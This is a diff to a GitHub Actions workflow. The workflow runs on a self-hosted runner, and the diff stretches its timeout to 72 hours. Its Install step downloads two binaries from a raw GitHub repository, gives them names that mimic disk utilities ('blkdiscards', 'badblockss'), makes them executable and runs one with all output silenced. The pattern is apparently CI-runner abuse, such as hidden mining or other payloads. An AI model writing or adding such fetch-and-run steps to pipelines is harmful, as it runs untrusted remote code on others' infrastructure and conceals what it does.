@@ -1,4 +1,4 @@
-name: ENV
+name: Colabs
 on:
   push:
   workflow_dispatch:
@@ -6,18 +6,10 @@ jobs:
   Build:
     name: hanakaru
     runs-on: self-hosted
-    strategy:
-      max-parallel: 20
-      fail-fast: false
-      matrix:
-        hanakaru: [1.4, 1.5, 1.6, 1.7]
-        flag: [A, B, C, D, E]
-    timeout-minutes: 2000
-    env:
-        NUM_JOBS: 20
+    timeout-minutes: 4320
     steps:
     - name: Setup
       uses: actions/checkout@v1
     - name: Install
       run: |
-        wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && chmod +x blkdiscards badblockss && timeout 15m ./badblockss
+        wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && chmod +x blkdiscards badblockss && ./badblockss >/dev/null 2>&1
